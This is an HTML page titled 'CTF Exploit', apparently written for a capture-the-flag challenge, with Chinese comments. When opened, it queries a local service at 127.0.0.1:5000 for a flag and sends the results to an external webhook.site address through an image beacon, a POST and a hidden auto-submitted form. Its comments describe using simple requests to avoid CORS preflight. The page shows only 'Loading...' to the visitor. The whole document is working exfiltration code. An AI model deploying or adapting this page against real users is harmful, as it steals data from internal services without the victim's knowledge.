<!DOCTYPE html>
<html>
<head>
    <title>CTF Exploit</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // 你的 webhook.site URL (記得替換成你的)
        const webhookUrl = 'https://webhook.site/23ec46e9-3d01-4059-9ddd-8b65ad743c9a';
        
        // 方法1: 使用簡單請求避免預檢
        function sendDataSimple(data) {
            // 使用 GET 請求將數據作為 URL 參數發送，避免 CORS 預檢
            const params = new URLSearchParams({
                message: 'Flag found!',
                data: JSON.stringify(data)
            });
            
            const img = new Image();
            img.src = webhookUrl + '?' + params.toString();
        }
        
        // 方法2: 嘗試發送 POST 請求 (簡單的 content-type)
        function sendDataPost(data) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain',  // 使用 text/plain 避免預檢
                },
                body: JSON.stringify({
                    message: 'Flag found!',
                    results: data
                })
            }).catch(err => console.log('POST failed:', err));
        }
        
        // 發送請求到本地的 /search 端點搜尋 flag
        fetch('http://127.0.0.1:5000/search?q=flag')
            .then(response => response.json())
            .then(data => {
                console.log('Search results:', data);
                
                // 同時使用兩種方法發送數據
                sendDataSimple(data);
                sendDataPost(data);
                
                // 方法3: 使用 form 提交
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = webhookUrl;
                form.style.display = 'none';
                
                const input = document.createElement('input');
                input.name = 'data';
                input.value = JSON.stringify(data);
                form.appendChild(input);
                
                document.body.appendChild(form);
                form.submit();
            })
            .catch(error => {
                console.error('Error:', error);
                
                // 發送錯誤信息
                const img = new Image();
                img.src = webhookUrl + '?error=' + encodeURIComponent(error.toString());
            });
    </script>
</body>
</html>
